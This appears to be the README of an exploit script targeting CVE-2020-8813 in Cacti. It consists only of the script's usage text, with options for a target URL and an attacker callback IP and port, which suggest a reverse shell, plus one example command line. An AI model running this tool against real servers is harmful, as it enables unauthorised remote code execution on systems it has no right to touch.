# Cacti-CVE-2020-8813

    Usage: cacti_rce.py [options]

    Options:
      -h, --help            show this help message and exit
      -u URL, --url=URL     [ Required ] target URL eg:. http://Cacti/
      -l LHOST, --lhost=LHOST
                            [ Required ] Attacker IP addr
      -p LPORT, --lport=LPORT
                            [ Default 443 ] Attacker IP Port
                            
                            
# Example:
```
python3 cacti_rce.py -u http://CACTI/ -l 192.168.x.x
```
